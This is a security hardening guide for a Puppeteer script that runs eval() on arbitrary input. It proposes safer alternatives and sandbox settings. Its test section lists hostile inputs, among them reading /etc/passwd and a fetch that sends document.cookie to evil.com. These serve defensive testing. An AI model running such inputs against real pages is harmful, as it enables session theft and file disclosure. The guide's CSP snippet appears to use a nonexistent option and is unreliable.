# Chrome DevTools Scripts - Security Hardening Guide

## Critical Security Issue: evaluate.js

### ⚠️ SECURITY WARNING

The `evaluate.js` script uses `eval()` to execute arbitrary JavaScript code, which poses a **CRITICAL SECURITY RISK**.

### Current Implementation (UNSAFE)

```javascript
const result = await page.evaluate((script) => {
  return eval(script);  // UNSAFE!
}, args.script);
```

### Security Risks

1. **Remote Code Execution (RCE):** Arbitrary JavaScript execution
2. **Data Exfiltration:** Access to sensitive page data
3. **System Compromise:** Potential for escaping sandbox

### Recommended Mitigations

#### Option 1: Remove eval() - Use Safe Alternatives

Instead of accepting arbitrary JavaScript:

```javascript
// Safe alternative - predefined operations only
const SAFE_OPERATIONS = {
  'getTitle': () => document.title,
  'getUrl': () => window.location.href,
  'getInnerText': (selector) => document.querySelector(selector)?.innerText,
  'getAttribute': (selector, attr) => document.querySelector(selector)?.getAttribute(attr),
};

const result = await page.evaluate((operation, ...args) => {
  const fn = SAFE_OPERATIONS[operation];
  if (!fn) throw new Error(`Operation ${operation} not allowed`);
  return fn(...args);
}, args.operation, ...args.params);
```

#### Option 2: Restricted Function Constructor (Safer than eval)

If you must support custom code:

```javascript
// Slightly safer - but still risky
const result = await page.evaluate((script) => {
  // Whitelist allowed globals
  const safeGlobals = {
    document: document,
    window: window,
    console: console,
  };
  
  // Create function in restricted context
  const fn = new Function(
    'document', 'window', 'console',
    `"use strict"; return (${script})`
  );
  
  return fn(safeGlobals.document, safeGlobals.window, safeGlobals.console);
}, args.script);
```

#### Option 3: JSON-based Query Language

Use a declarative query language instead of code:

```javascript
// Query format:
// { "selector": "h1", "property": "innerText" }
// { "selector": "img", "property": "src", "all": true }

const result = await page.evaluate((query) => {
  const { selector, property, all = false } = query;
  
  if (all) {
    const elements = document.querySelectorAll(selector);
    return Array.from(elements).map(el => el[property]);
  }
  
  const element = document.querySelector(selector);
  return element ? element[property] : null;
}, JSON.parse(args.query));
```

### Implementation Checklist

- [ ] Remove eval() from evaluate.js
- [ ] Implement safe alternative (Option 1, 2, or 3)
- [ ] Add input validation
- [ ] Add usage documentation
- [ ] Update tests
- [ ] Add security warnings to README

### Usage Guidelines

**DO:**
- ✅ Use predefined safe operations
- ✅ Validate all inputs
- ✅ Log operations for audit
- ✅ Run in sandboxed environment
- ✅ Set resource limits

**DON'T:**
- ❌ Accept arbitrary code from untrusted sources
- ❌ Use eval() or new Function() with user input
- ❌ Grant excessive permissions
- ❌ Disable security features (--no-sandbox)
- ❌ Trust client-side validation alone

### Testing Security

```javascript
// Test cases for security
const MALICIOUS_INPUTS = [
  "require('fs').readFileSync('/etc/passwd')",
  "process.exit(1)",
  "while(true){}",  // DoS
  "fetch('http://evil.com/?data=' + document.cookie)",
];

// All should be rejected/blocked
```

### Additional Security Measures

1. **Rate Limiting:**
   ```javascript
   const rateLimit = new Map();
   const MAX_REQUESTS = 10;
   const WINDOW_MS = 60000;
   
   function checkRateLimit(identifier) {
     const now = Date.now();
     const requests = rateLimit.get(identifier) || [];
     const recent = requests.filter(t => now - t < WINDOW_MS);
     
     if (recent.length >= MAX_REQUESTS) {
       throw new Error('Rate limit exceeded');
     }
     
     rateLimit.set(identifier, [...recent, now]);
   }
   ```

2. **Timeout Protection:**
   ```javascript
   const result = await Promise.race([
     page.evaluate(safeOperation),
     new Promise((_, reject) => 
       setTimeout(() => reject(new Error('Timeout')), 5000)
     )
   ]);
   ```

3. **Content Security Policy:**
   ```javascript
   await page.setContent(html, {
     waitUntil: 'networkidle0',
     securityPolicy: {
       directives: {
         defaultSrc: ["'self'"],
         scriptSrc: ["'self'"],
       }
     }
   });
   ```

### Alternative: Use Puppeteer's Built-in Methods

Instead of custom JavaScript evaluation, use Puppeteer's API:

```javascript
// Instead of evaluate with custom code:
// await page.evaluate(() => document.title)

// Use Puppeteer methods:
await page.title()
await page.$eval('h1', el => el.textContent)
await page.$$eval('a', links => links.map(a => a.href))
```

## Browser Launch Security

### Current Configuration

```javascript
args: [
  '--no-sandbox',           // INSECURE
  '--disable-setuid-sandbox', // INSECURE
]
```

### Recommendations

1. **Use sandbox when possible**
2. **If sandbox must be disabled:**
   - Document why
   - Run in isolated environment (container)
   - Limit permissions
   - Monitor for suspicious activity

3. **Additional security flags:**
```javascript
args: [
  '--disable-dev-shm-usage',  // Good
  '--disable-extensions',     // Recommended
  '--disable-plugins',        // Recommended
  '--disable-gpu',           // May help security
  '--no-first-run',          // Recommended
  '--no-default-browser-check', // Recommended
]
```

## Summary

The `evaluate.js` script has a **CRITICAL** security vulnerability that must be addressed before using in production. Implement one of the recommended mitigations and follow all security best practices.

---

**Last Updated:** February 15, 2026  
**Severity:** CRITICAL  
**Status:** REQUIRES IMMEDIATE ATTENTION
